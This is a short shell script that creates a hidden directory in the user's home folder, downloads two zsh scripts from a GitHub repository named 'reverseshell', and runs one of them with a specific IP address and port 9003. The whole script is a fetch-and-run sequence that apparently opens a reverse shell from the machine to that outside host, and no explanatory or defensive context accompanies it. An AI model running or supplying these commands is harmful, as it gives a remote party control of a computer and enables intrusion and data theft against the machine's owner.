cd ~
mkdir .reverse_shell_mmob
cd .reverse_shell_mmob
curl -o reverseshell.zsh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/reverseshell.zsh
curl -o start.zsh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/start.zsh
zsh start.zsh 71.173.141.166 9003
